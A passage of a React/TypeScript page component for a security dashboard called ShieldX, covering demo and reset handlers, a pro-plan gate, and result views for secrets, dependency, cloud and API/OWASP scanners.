  const [alertCustomWebhook, setAlertCustomWebhook] = useState("");
  const [alertThreshold, setAlertThreshold] = useState<"critical" | "high" | "all">("critical");
  const [alertRules, setAlertRules] = useState<AlertRule[]>(DEFAULT_ALERT_RULES);
  const [alertSaved, setAlertSaved] = useState(false);
  const [alertTestSent, setAlertTestSent] = useState(false);

  // Scores (derived)
  const scores = calculateScores({
    secrets: secretsResults || [],
    depsVulns: depsResults?.vulnerabilities || [],
    depTotal: depsResults?.totalDeps ?? 0,
    cloudAnswers,
    apiScore: apiResults?.score ?? null,
    logFindings: logsResults || [],
  });

  const radarData = [
    { category: "Secrets", score: scores.secrets },
    { category: "Dependencies", score: scores.deps },
    { category: "Cloud", score: scores.cloud },
    { category: "API", score: scores.api },
    { category: "Logs", score: scores.logs },
  ];

  // Copy to clipboard
  const copyToClipboard = useCallback(async (text: string, id: string) => {
    await navigator.clipboard.writeText(text);
    setCopiedSnippet(id);
    setTimeout(() => setCopiedSnippet(null), 2000);
  }, []);

  // RUN DEMO
  const runDemo = useCallback(async () => {
    setIsDemo(true);

    setSecretsInput(DEMO_CODE);
    setSecretsScanning(true);
    await new Promise((r) => setTimeout(r, 800));
    setSecretsResults(scanSecrets(DEMO_CODE));
    setSecretsScanning(false);

    setDepsInput(DEMO_PACKAGE_JSON);
    setDepsScanning(true);
    setDepsError("");
    try {
      const resp = await fetch("/api/shieldx/scan-deps", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ input: DEMO_PACKAGE_JSON }),
      });
      const data = await resp.json();
      if (data.error) setDepsError(data.error);
      else setDepsResults(data);
    } catch {
      setDepsError("Failed to scan dependencies — API unavailable");
    }
    setDepsScanning(false);

    setCloudAnswers(Object.fromEntries(Object.entries(DEMO_CLOUD_ANSWERS).map(([k, v]) => [k, v])));

    setApiUrl(DEMO_API_URL);
    setApiScanning(true);
    setApiError("");
    try {
      const resp = await fetch("/api/shieldx/scan-api", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: DEMO_API_URL }),
      });
      const data = await resp.json();
      if (data.error) setApiError(data.error);
      else setApiResults(data);
    } catch {
      setApiError("Failed to scan API endpoint");
    }
    setApiScanning(false);

    setLogsInput(DEMO_LOGS);
    setLogsScanning(true);
    await new Promise((r) => setTimeout(r, 700));
    setLogsResults(analyzeLogs(DEMO_LOGS));
    setLogsScanning(false);

    setActiveTab("score");
  }, []);

  // RESET ALL
  const resetAll = useCallback(() => {
    setIsDemo(false);
    setSecretsInput(""); setSecretsResults(null);
    setDepsInput(""); setDepsResults(null); setDepsError("");
    setCloudAnswers(() => {
      const i: Record<string, boolean | null> = {};
      CLOUD_CHECKS.forEach((c) => (i[c.id] = null));
      return i;
    });
    setApiUrl(""); setApiResults(null); setApiError("");
    setLogsInput(""); setLogsResults(null);
    setCicdTestResult(null);
    setAlertTestSent(false); setAlertSaved(false);
    setActiveTab("secrets");
  }, []);

  // Scanner actions
  const runSecretsScan = () => {
    setSecretsScanning(true);
    setTimeout(() => { setSecretsResults(scanSecrets(secretsInput)); setSecretsScanning(false); }, 500);
  };

  const runDepsScan = async () => {
    if (!depsInput.trim()) return;
    setDepsScanning(true); setDepsError(""); setDepsResults(null);
    try {
      const resp = await fetch("/api/shieldx/scan-deps", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ input: depsInput }),
      });
      const data = await resp.json();
      if (data.error) setDepsError(data.error);
      else setDepsResults(data);
    } catch {
      setDepsError("Failed to scan dependencies");
    }
    setDepsScanning(false);
  };

  const runApiScan = async () => {
    if (!apiUrl.trim()) return;
    setApiScanning(true); setApiError(""); setApiResults(null);
    try {
      const resp = await fetch("/api/shieldx/scan-api", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: apiUrl }),
      });
      const data = await resp.json();
      if (data.error) setApiError(data.error);
      else setApiResults(data);
    } catch {
      setApiError("Failed to scan endpoint");
    }
    setApiScanning(false);
  };

  const runLogsScan = () => {
    setLogsScanning(true);
    setTimeout(() => { setLogsResults(analyzeLogs(logsInput)); setLogsScanning(false); }, 500);
  };

  const runCicdTest = async () => {
    setCicdTesting(true); setCicdTestResult(null);
    try {
      const resp = await fetch("/api/shieldx/ci-scan", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          scanType: "secrets",
          code: DEMO_CODE,
          projectName: "shieldx-test",
        }),
      });
      const data = await resp.json();
      setCicdTestResult(data);
    } catch {
      setCicdTestResult({ verdict: "ERROR", exitCode: 1 });
    }
    setCicdTesting(false);
  };

  const severityColor = (s: string) => {
    if (s === "critical") return "text-red-500";
    if (s === "high") return "text-orange-500";
    if (s === "medium") return "text-yellow-500";
    return "text-green-500";
  };
  const severityBg = (s: string) => {
    if (s === "critical") return "bg-red-500/10 border-red-500/20";
    if (s === "high") return "bg-orange-500/10 border-orange-500/20";
    if (s === "medium") return "bg-yellow-500/10 border-yellow-500/20";
    return "bg-green-500/10 border-green-500/20";
  };
  const statusIcon = (s: string) => {
    if (s === "pass") return <CheckCircle2 className="h-4 w-4 text-emerald-500" />;
    if (s === "fail") return <XCircle className="h-4 w-4 text-red-500" />;
    return <AlertTriangle className="h-4 w-4 text-yellow-500" />;
  };

  const hasAnyResults = secretsResults !== null || depsResults !== null || apiResults !== null || logsResults !== null ||
    Object.values(cloudAnswers).some((v) => v !== null);

  const highConfSecrets = secretsResults?.filter((f) => f.confidence !== "low") ?? [];
  const lowConfSecrets = secretsResults?.filter((f) => f.confidence === "low") ?? [];

  const isTabLocked = (tab: TabKey) => !hasPro && !isDemo && (TABS.find(t => t.key === tab)?.proOnly ?? false);

  return (
    <div className="py-8 sm:py-16">
      <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">

        {/* ═══ PREMIUM HERO SECTION ═══ */}
        <div className="relative mb-14 rounded-3xl overflow-hidden border border-border/50">
          {/* Animated gradient mesh */}
          <div className="absolute inset-0 bg-gradient-to-br from-primary/[0.03] via-transparent to-cyan-500/[0.03]" />
          <div className="absolute top-0 left-1/4 w-72 h-72 bg-primary/[0.07] rounded-full blur-[100px] animate-pulse" />
          <div className="absolute bottom-0 right-1/4 w-72 h-72 bg-cyan-500/[0.07] rounded-full blur-[100px] animate-pulse [animation-delay:2s]" />
          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-blue-500/[0.04] rounded-full blur-[120px]" />

          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="relative text-center py-16 sm:py-20 px-6"
          >
            {/* Product Badge */}
            <div className="inline-flex items-center gap-2.5 px-4 py-2 rounded-full bg-background/80 backdrop-blur-sm border border-border/80 shadow-sm mb-8">
              <div className="relative flex items-center justify-center">
                <Shield className="h-5 w-5 text-primary" />
                <span className="absolute -top-0.5 -right-0.5 flex h-2.5 w-2.5">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                  <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500" />
                </span>
              </div>
              <span className="text-sm font-semibold">Enterprise Security Platform</span>
              {hasPro && (
                <Badge className="bg-gradient-to-r from-amber-500 to-orange-500 text-white border-0 text-[10px] px-2 shadow-sm">
                  <Crown className="h-3 w-3 mr-0.5" /> PRO
                </Badge>
              )}
            </div>

            {/* Main Title */}
            <h1 className="text-4xl sm:text-5xl lg:text-6xl xl:text-7xl font-black tracking-tight leading-[1.05]">
              <span className="block mb-1">SCR</span>
              <span className="bg-gradient-to-r from-primary via-blue-500 to-cyan-500 bg-clip-text text-transparent">
                ShieldX
              </span>
            </h1>

            <p className="mt-6 text-lg sm:text-xl text-muted-foreground max-w-3xl mx-auto leading-relaxed">
              The complete security platform for modern engineering teams.{" "}
              <span className="hidden sm:inline">
                Scan secrets, audit dependencies, test APIs against OWASP Top 10, and monitor your entire stack.
              </span>
              <span className="sm:hidden">8 security modules in one platform.</span>
            </p>

            {/* Stats Row */}
            <div className="mt-10 grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4 max-w-3xl mx-auto">
              {[
                { value: "8", label: "Security Modules", icon: Shield },
                { value: "20+", label: "Secret Patterns", icon: Key },
                { value: "Live", label: "OSV.dev Database", icon: Package },
                { value: "OWASP", label: "API Top 10 2023", icon: Globe },
              ].map((stat, i) => (
                <motion.div
                  key={stat.label}
                  initial={{ opacity: 0, y: 15 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.15 + i * 0.08 }}
                  className="group p-4 rounded-2xl bg-background/60 backdrop-blur-sm border border-border/50 shadow-sm hover:shadow-md hover:border-primary/20 transition-all duration-300"
                >
                  <stat.icon className="h-5 w-5 text-primary mx-auto mb-2 group-hover:scale-110 transition-transform" />
                  <div className="text-2xl font-extrabold tracking-tight">{stat.value}</div>
                  <div className="text-[11px] sm:text-xs text-muted-foreground font-medium">{stat.label}</div>
                </motion.div>
              ))}
            </div>

            {/* CTA Buttons */}
            <div className="mt-10 flex flex-wrap justify-center gap-3">
              <Button
                size="lg"
                onClick={runDemo}
                className="gap-2 text-base px-8 h-12 rounded-xl shadow-lg shadow-primary/25 hover:shadow-primary/40 transition-all duration-300"
                disabled={secretsScanning || depsScanning || apiScanning || logsScanning}
              >
                {(secretsScanning || depsScanning || apiScanning || logsScanning) ? (
                  <Loader2 className="h-5 w-5 animate-spin" />
                ) : (
                  <Play className="h-5 w-5" />
                )}
                Run Full Demo
              </Button>
              <Link href="/shieldx/pricing">
                <Button size="lg" variant="outline" className="gap-2 text-base px-8 h-12 rounded-xl hover:bg-primary/5 transition-all duration-300">
                  <Crown className="h-5 w-5" /> View Pricing
                </Button>
              </Link>
              {hasAnyResults && (
                <Button size="lg" variant="ghost" onClick={resetAll} className="gap-2 px-6 h-12 rounded-xl">
                  <RotateCcw className="h-4 w-4" /> Reset
                </Button>
              )}
            </div>

            {isDemo && (
              <motion.div initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} className="mt-5">
                <Badge variant="outline" className="gap-1.5 bg-amber-500/10 text-amber-600 dark:text-amber-400 border-amber-500/20 px-3 py-1.5">
                  <Activity className="h-3.5 w-3.5" /> Demo Mode — viewing sample data across all modules
                </Badge>
              </motion.div>
            )}
          </motion.div>
        </div>

        {/* ═══ MODULE NAVIGATION ═══ */}
        <div className="mb-8">
          <div className="flex flex-wrap justify-center gap-1.5 sm:gap-2 p-1.5 sm:p-2 rounded-2xl bg-muted/30 border border-border/50 backdrop-blur-sm">
            {TABS.map((tab) => {
              const active = activeTab === tab.key;
              const locked = isTabLocked(tab.key);
              return (
                <button
                  key={tab.key}
                  onClick={() => setActiveTab(tab.key)}
                  className={`relative flex items-center gap-1.5 sm:gap-2 px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl text-xs sm:text-sm font-medium transition-all duration-200 ${
                    active
                      ? "bg-primary text-primary-foreground shadow-lg shadow-primary/25"
                      : locked
                      ? "text-muted-foreground/50 hover:text-muted-foreground/70 hover:bg-muted/30"
                      : "text-muted-foreground hover:bg-muted/80 hover:text-foreground"
                  }`}
                >
                  <tab.icon className="h-3.5 w-3.5 sm:h-4 sm:w-4" />
                  <span className="hidden sm:inline">{tab.label}</span>
                  <span className="sm:hidden">{tab.label.split(" ")[0]}</span>
                  {locked && !active && (
                    <Lock className="h-3 w-3 opacity-50" />
                  )}
                  {tab.key === "secrets" && secretsResults && highConfSecrets.length > 0 && (
                    <span className="ml-0.5 bg-red-500 text-white text-[10px] sm:text-xs rounded-full px-1.5 py-0.5 font-bold leading-none">{highConfSecrets.length}</span>
                  )}
                  {tab.key === "deps" && depsResults && depsResults.vulnerabilities.length > 0 && (
                    <span className="ml-0.5 bg-red-500 text-white text-[10px] sm:text-xs rounded-full px-1.5 py-0.5 font-bold leading-none">{depsResults.vulnerabilities.length}</span>
                  )}
                  {tab.key === "logs" && logsResults && logsResults.length > 0 && (
                    <span className="ml-0.5 bg-red-500 text-white text-[10px] sm:text-xs rounded-full px-1.5 py-0.5 font-bold leading-none">{logsResults.length}</span>
                  )}
                </button>
              );
            })}
          </div>
        </div>

        {/* TAB CONTENT */}
        <AnimatePresence mode="wait">
          <motion.div
            key={activeTab}
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -15 }}
            transition={{ duration: 0.25 }}
          >

            {/* ═══ GATED TAB CONTENT ═══ */}
            {isTabLocked(activeTab) ? (
              <Card className="relative overflow-hidden border-2 border-dashed border-primary/20">
                <div className="absolute inset-0 bg-gradient-to-br from-primary/[0.03] via-transparent to-cyan-500/[0.03]" />
                <CardContent className="relative py-16 sm:py-20 text-center">
                  <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} transition={{ duration: 0.3 }}>
                    <div className="mx-auto mb-6 inline-flex rounded-2xl bg-gradient-to-br from-primary/10 to-cyan-500/10 p-6 ring-1 ring-primary/10">
                      <Lock className="h-10 w-10 text-primary" />
                    </div>
                    <h3 className="text-2xl sm:text-3xl font-bold mb-3">
                      Upgrade to{" "}
                      <span className="bg-gradient-to-r from-primary to-cyan-500 bg-clip-text text-transparent">ShieldX Pro</span>
                    </h3>
                    <p className="text-muted-foreground max-w-lg mx-auto mb-2 text-base">
                      <strong>{TABS.find(t => t.key === activeTab)?.label}</strong> is available on the Pro plan.
                      Get full access to all 8 security modules, CI/CD integration, and real-time alerts.
                    </p>
                    <div className="flex flex-wrap justify-center gap-2 mt-6 mb-8">
                      {TABS.filter(t => t.proOnly).map(t => (
                        <Badge key={t.key} variant="outline" className="gap-1 text-xs bg-background/80">
                          <t.icon className="h-3 w-3" /> {t.label}
                        </Badge>
                      ))}
                    </div>
                    <div className="flex flex-wrap justify-center gap-3">
                      <Link href="/shieldx/pricing">
                        <Button size="lg" className="gap-2 px-8 h-12 rounded-xl shadow-lg shadow-primary/25">
                          <Crown className="h-4 w-4" /> View Plans & Pricing
                        </Button>
                      </Link>
                      {!session && (
                        <Link href="/auth/register">
                          <Button size="lg" variant="outline" className="gap-2 px-8 h-12 rounded-xl">
                            Create Free Account
                          </Button>
                        </Link>
                      )}
                    </div>
                    <p className="text-xs text-muted-foreground mt-6">
                      Starting at $499/month · All 8 modules · Cancel anytime
                    </p>
                  </motion.div>
                </CardContent>
              </Card>
            ) : (
            <>

            {/* ═══ SECRETS SCANNER ═══ */}
            {activeTab === "secrets" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Key className="h-5 w-5 text-red-500" />
                    Secrets Exposure Scanner
                    <Badge variant="outline" className="ml-2 text-xs">{SECRET_PATTERNS.length} patterns + entropy</Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Paste your source code, config files, or .env content. Uses {SECRET_PATTERNS.length} regex patterns combined with
                    Shannon entropy analysis to reduce false positives and score confidence levels.
                  </p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <Textarea
                    placeholder="Paste your code, config, or .env file here..."
                    className="font-mono text-sm min-h-[200px]"
                    value={secretsInput}
                    onChange={(e) => setSecretsInput(e.target.value)}
                  />
                  <Button onClick={runSecretsScan} disabled={!secretsInput.trim() || secretsScanning} className="gap-2">
                    {secretsScanning ? <Loader2 className="h-4 w-4 animate-spin" /> : <Search className="h-4 w-4" />}
                    {secretsScanning ? "Scanning..." : "Scan for Secrets"}
                  </Button>

                  {secretsResults !== null && (
                    <div className="mt-6 space-y-4">
                      {highConfSecrets.length === 0 && lowConfSecrets.length === 0 ? (
                        <div className="flex items-center gap-3 p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
                          <CheckCircle2 className="h-5 w-5 text-emerald-500" />
                          <div>
                            <div className="font-semibold text-emerald-600 dark:text-emerald-400">No secrets detected</div>
                            <div className="text-sm text-muted-foreground">Your code appears clean of hardcoded credentials.</div>
                          </div>
                        </div>
                      ) : (
                        <>
                          {highConfSecrets.length > 0 && (
                            <div className="space-y-3">
                              <div className="flex items-center gap-2">
                                <AlertTriangle className="h-5 w-5 text-red-500" />
                                <span className="font-bold text-red-500">{highConfSecrets.length} confirmed secret(s)</span>
                                <Badge variant="outline" className="text-xs">High/Medium Confidence</Badge>
                              </div>
                              {highConfSecrets.map((f, i) => (
                                <div key={i} className={`rounded-lg border p-4 ${severityBg(f.severity)}`}>
                                  <div className="flex items-center justify-between mb-2">
                                    <div className="flex items-center gap-2">
                                      <Eye className={`h-4 w-4 ${severityColor(f.severity)}`} />
                                      <span className="font-semibold text-sm">{f.pattern}</span>
                                    </div>
                                    <div className="flex items-center gap-2">
                                      <Badge variant="outline" className={`text-[10px] ${f.confidence === "high" ? "text-red-500 border-red-500/30" : "text-yellow-500 border-yellow-500/30"}`}>
                                        {f.confidence} conf
                                      </Badge>
                                      <Badge variant="outline" className="text-[10px]">
                                        entropy: {f.entropy}
                                      </Badge>
                                      <Badge variant={f.severity === "critical" ? "destructive" : "outline"} className="text-xs">{f.severity}</Badge>
                                      <span className="text-xs text-muted-foreground">Line {f.line}</span>
                                    </div>
                                  </div>
                                  <div className="font-mono text-xs bg-background/50 rounded px-3 py-2 mb-2 break-all">{f.match}</div>
                                  <div className="flex items-start gap-2 text-sm">
                                    <CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" />
                                    <span className="text-emerald-600 dark:text-emerald-400"><strong>Fix:</strong> {f.fix}</span>
                                  </div>
                                </div>
                              ))}
                            </div>
                          )}

                          {lowConfSecrets.length > 0 && (
                            <details className="mt-4">
                              <summary className="cursor-pointer text-sm text-muted-foreground hover:text-foreground transition-colors">
                                {lowConfSecrets.length} possible false positive(s) — low confidence matches (click to expand)
                              </summary>
                              <div className="mt-3 space-y-2">
                                {lowConfSecrets.map((f, i) => (
                                  <div key={i} className="rounded-lg border border-border/50 p-3 opacity-70">
                                    <div className="flex items-center justify-between mb-1">
                                      <span className="text-sm text-muted-foreground">{f.pattern}</span>
                                      <div className="flex items-center gap-2">
                                        <Badge variant="outline" className="text-[10px] text-muted-foreground">low conf</Badge>
                                        <Badge variant="outline" className="text-[10px]">entropy: {f.entropy}</Badge>
                                        <span className="text-xs text-muted-foreground">Line {f.line}</span>
                                      </div>
                                    </div>
                                    <div className="font-mono text-xs text-muted-foreground break-all">{f.match}</div>
                                  </div>
                                ))}
                              </div>
                            </details>
                          )}
                        </>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            )}

            {/* ═══ DEPENDENCY SCANNER (OSV.dev API) ═══ */}
            {activeTab === "deps" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Package className="h-5 w-5 text-orange-500" />
                    Dependency Vulnerability Scanner
                    <Badge variant="outline" className="ml-2 text-xs gap-1">
                      <ExternalLink className="h-3 w-3" /> Real-time via OSV.dev
                    </Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Paste your package.json, requirements.txt, or build.gradle. Each dependency is queried against
                    Google&apos;s Open Source Vulnerabilities (OSV) database for real-time CVE data across all ecosystems.
                  </p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <Textarea
                    placeholder={`Paste your package.json, requirements.txt, or build.gradle...\n\nExample:\n{\n  "dependencies": {\n    "lodash": "^4.17.20"\n  }\n}`}
                    className="font-mono text-sm min-h-[200px]"
                    value={depsInput}
                    onChange={(e) => setDepsInput(e.target.value)}
                  />
                  <Button onClick={runDepsScan} disabled={!depsInput.trim() || depsScanning} className="gap-2">
                    {depsScanning ? <Loader2 className="h-4 w-4 animate-spin" /> : <Search className="h-4 w-4" />}
                    {depsScanning ? "Querying OSV.dev..." : "Scan Dependencies"}
                  </Button>

                  {depsError && (
                    <div className="flex items-center gap-2 p-3 rounded-lg bg-red-500/10 border border-red-500/20 text-red-500 text-sm">
                      <XCircle className="h-4 w-4 shrink-0" /> {depsError}
                    </div>
                  )}

                  {depsResults !== null && (
                    <div className="mt-6 space-y-4">
                      <div className="flex flex-wrap gap-3 text-sm">
                        <span className="text-muted-foreground">
                          Ecosystem: <strong>{depsResults.ecosystem}</strong>
                        </span>
                        <span className="text-muted-foreground">
                          Scanned: <strong>{depsResults.scannedPackages}/{depsResults.totalDeps}</strong> packages
                        </span>
                        <Badge variant="outline" className="text-xs gap-1">
                          <ExternalLink className="h-3 w-3" /> {depsResults.source}
                        </Badge>
                      </div>

                      {depsResults.stats && (
                        <div className="flex gap-3">
                          {depsResults.stats.critical > 0 && <Badge variant="destructive" className="text-xs">{depsResults.stats.critical} Critical</Badge>}
                          {depsResults.stats.high > 0 && <Badge className="text-xs bg-orange-500">{depsResults.stats.high} High</Badge>}
                          {depsResults.stats.medium > 0 && <Badge className="text-xs bg-yellow-500 text-black">{depsResults.stats.medium} Medium</Badge>}
                          {depsResults.stats.low > 0 && <Badge variant="outline" className="text-xs">{depsResults.stats.low} Low</Badge>}
                        </div>
                      )}

                      {depsResults.errors && depsResults.errors.length > 0 && (
                        <div className="text-sm text-yellow-500">
                          <AlertTriangle className="inline h-3.5 w-3.5 mr-1" />
                          {depsResults.errors.length} package(s) had scan errors
                        </div>
                      )}

                      {depsResults.vulnerabilities.length === 0 ? (
                        <div className="flex items-center gap-3 p-4 rounded-lg bg-emerald-500/10 border border-emerald-500/20">
                          <CheckCircle2 className="h-5 w-5 text-emerald-500" />
                          <div>
                            <div className="font-semibold text-emerald-600 dark:text-emerald-400">No known vulnerabilities</div>
                            <div className="text-sm text-muted-foreground">All dependencies checked against OSV.dev — no CVEs found.</div>
                          </div>
                        </div>
                      ) : (
                        <div className="space-y-3">
                          <div className="flex items-center gap-2">
                            <AlertTriangle className="h-5 w-5 text-orange-500" />
                            <span className="font-bold text-orange-500">{depsResults.vulnerabilities.length} vulnerability(ies) found</span>
                          </div>
                          {depsResults.vulnerabilities.map((v, i) => (
                            <div key={i} className={`rounded-lg border p-4 ${severityBg(v.severity)}`}>
                              <div className="flex items-center justify-between mb-2">
                                <span className="font-semibold">{v.package} <span className="text-sm text-muted-foreground">v{v.version}</span></span>
                                <Badge variant={v.severity === "critical" ? "destructive" : "outline"} className="text-xs">{v.severity}</Badge>
                              </div>
                              <div className="text-sm font-mono text-muted-foreground mb-1">{v.id}</div>
                              {v.aliases.length > 0 && (
                                <div className="text-xs text-muted-foreground mb-1">
                                  Also: {v.aliases.join(", ")}
                                </div>
                              )}
                              <div className="text-sm mb-2">{v.summary}</div>
                              {v.fixedIn && (
                                <div className="flex items-start gap-2 text-sm mb-1">
                                  <CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" />
                                  <span className="text-emerald-600 dark:text-emerald-400"><strong>Fix:</strong> Upgrade to {v.fixedIn}+</span>
                                </div>
                              )}
                              {v.references.length > 0 && (
                                <div className="flex gap-2 mt-2">
                                  {v.references.slice(0, 2).map((ref, ri) => (
                                    <a key={ri} href={ref} target="_blank" rel="noopener noreferrer" className="text-xs text-primary hover:underline flex items-center gap-1">
                                      <ExternalLink className="h-3 w-3" /> Reference {ri + 1}
                                    </a>
                                  ))}
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </CardContent>
              </Card>
            )}

            {/* ═══ CLOUD SECURITY ═══ */}
            {activeTab === "cloud" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Cloud className="h-5 w-5 text-sky-500" />
                    Cloud Security Assessment
                    <Badge variant="outline" className="ml-2 text-xs">{CLOUD_CHECKS.length} checks</Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Answer each question about your cloud infrastructure. ShieldX calculates a security score and provides
                    specific fix guidance for every failing check.
                  </p>
                </CardHeader>
                <CardContent>
                  {(["AWS", "GCP", "Azure", "General"] as const).map((platform) => {
                    const checks = CLOUD_CHECKS.filter((c) => c.platform === platform);
                    const answered = checks.filter((c) => cloudAnswers[c.id] !== null);
                    const passed = answered.filter((c) => cloudAnswers[c.id] === true);
                    return (
                      <div key={platform} className="mb-8 last:mb-0">
                        <div className="flex items-center justify-between mb-3">
                          <h3 className="text-lg font-bold flex items-center gap-2">
                            {platform === "AWS" ? "☁️" : platform === "GCP" ? "🌐" : platform === "Azure" ? "🔷" : "🌍"} {platform}
                          </h3>
                          {answered.length > 0 && (
                            <span className="text-sm text-muted-foreground">{passed.length}/{answered.length} passing</span>
                          )}
                        </div>
                        <div className="space-y-3">
                          {checks.map((check) => {
                            const answer = cloudAnswers[check.id];
                            const isFail = answer === false;
                            return (
                              <div key={check.id} className={`rounded-lg border p-4 transition-colors ${
                                answer === null ? "border-border" : answer ? "bg-emerald-500/5 border-emerald-500/20" : "bg-red-500/5 border-red-500/20"
                              }`}>
                                <div className="flex items-start justify-between gap-4">
                                  <div className="flex-1">
                                    <div className="flex items-center gap-2 mb-1">
                                      <Badge variant="outline" className={`text-[10px] ${
                                        check.severity === "critical" ? "text-red-500 border-red-500/30" :
                                        check.severity === "high" ? "text-orange-500 border-orange-500/30" :
                                        "text-yellow-500 border-yellow-500/30"
                                      }`}>{check.severity}</Badge>
                                      <Badge variant="outline" className="text-[10px]">{check.category}</Badge>
                                    </div>
                                    <p className="text-sm font-medium">{check.question}</p>
                                  </div>
                                  <div className="flex gap-2 shrink-0">
                                    <button
                                      onClick={() => setCloudAnswers((prev) => ({ ...prev, [check.id]: true }))}
                                      className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-all ${
                                        answer === true
                                          ? "bg-emerald-500 text-white"
                                          : "bg-muted hover:bg-emerald-500/20 text-muted-foreground"
                                      }`}
                                    >Yes</button>
                                    <button
                                      onClick={() => setCloudAnswers((prev) => ({ ...prev, [check.id]: false }))}
                                      className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-all ${
                                        answer === false
                                          ? "bg-red-500 text-white"
                                          : "bg-muted hover:bg-red-500/20 text-muted-foreground"
                                      }`}
                                    >No</button>
                                  </div>
                                </div>
                                {isFail && (
                                  <div className="mt-3 space-y-1">
                                    <p className="text-sm text-red-500">{check.failMessage}</p>
                                    <div className="flex items-start gap-2 text-sm">
                                      <CheckCircle2 className="h-3.5 w-3.5 text-emerald-500 mt-0.5 shrink-0" />
                                      <span className="text-emerald-600 dark:text-emerald-400"><strong>Fix:</strong> {check.fix}</span>
                                    </div>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    );
                  })}
                </CardContent>
              </Card>
            )}

            {/* ═══ API SCANNER + OWASP ═══ */}
            {activeTab === "api" && (
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Globe className="h-5 w-5 text-violet-500" />
                    API Security Scanner
                    <Badge variant="outline" className="ml-2 text-xs">OWASP API Top 10 2023</Badge>
                  </CardTitle>
                  <p className="text-sm text-muted-foreground">
                    Enter any URL. ShieldX makes real HTTP requests to check security headers, OWASP API Top 10 coverage,
                    CORS, authentication, rate limiting, sensitive data exposure, and error leakage.
                  </p>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex gap-3">
                    <Input
                      placeholder="https://api.example.com/v1/health"
                      value={apiUrl}
                      onChange={(e) => setApiUrl(e.target.value)}
                      onKeyDown={(e) => e.key === "Enter" && runApiScan()}
                      className="font-mono"
                    />
                    <Button onClick={runApiScan} disabled={!apiUrl.trim() || apiScanning} className="gap-2 shrink-0">
                      {apiScanning ? <Loader2 className="h-4 w-4 animate-spin" /> : <Search className="h-4 w-4" />}
                      {apiScanning ? "Scanning..." : "Scan Endpoint"}
                    </Button>
                  </div>

                  {apiError && (
                    <div className="flex items-center gap-2 p-3 rounded-lg bg-red-500/10 border border-red-500/20 text-red-500 text-sm">
                      <XCircle className="h-4 w-4 shrink-0" /> {apiError}
                    </div>
                  )}

                  {apiResults && (
                    <div className="mt-6 space-y-6">
                      <div className="flex items-center justify-between">
                        <div>
                          <span className="font-mono text-sm">{apiResults.url}</span>
                          <span className="ml-2 text-sm text-muted-foreground">Status: {apiResults.status}</span>
                        </div>
                        <div className="text-right">
                          <div className="text-2xl font-bold text-primary">{apiResults.score}<span className="text-sm text-muted-foreground">/10</span></div>
                          <div className="text-xs text-muted-foreground">API Score</div>
                        </div>
                      </div>

                      {/* OWASP Coverage */}
                      {apiResults.owaspCoverage && apiResults.owaspCoverage.length > 0 && (
                        <div>
                          <h4 className="text-sm font-bold mb-2">OWASP API Top 10 Coverage</h4>
                          <div className="flex flex-wrap gap-2">
                            {apiResults.owaspCoverage.map((owasp, i) => (
                              <Badge key={i} variant="outline" className="text-xs gap-1 bg-violet-500/10 border-violet-500/30 text-violet-600 dark:text-violet-400">
                                <Shield className="h-3 w-3" /> {owasp}
                              </Badge>
                            ))}
                          </div>
                        </div>
                      )}

                      <div>
                        <h4 className="text-sm font-bold mb-3">Security Headers ({apiResults.headers.filter((h) => h.status === "pass").length}/{apiResults.headers.length} passing)</h4>
                        <div className="space-y-2">
                          {apiResults.headers.map((h, i) => (
                            <div key={i} className="flex items-center gap-3 text-sm p-2 rounded-lg border border-border/50">
                              {statusIcon(h.status)}
                              <span className="font-mono font-medium w-48 shrink-0">{h.name}</span>
                              <span className="text-muted-foreground flex-1 truncate">{h.message}</span>
                              <Badge variant="outline" className={`text-[10px] ${severityColor(h.severity)}`}>{h.severity}</Badge>
                            </div>
                          ))}
                        </div>
                      </div>

                      <div>
                        <h4 className="text-sm font-bold mb-3">API Security Checks ({apiResults.apiChecks.filter((c) => c.status === "pass").length}/{apiResults.apiChecks.length} passing)</h4>
                        <div className="space-y-2">
                          {apiResults.apiChecks.map((c, i) => (
                            <div key={i} className="flex items-center gap-3 text-sm p-2 rounded-lg border border-border/50">
                              {statusIcon(c.status)}
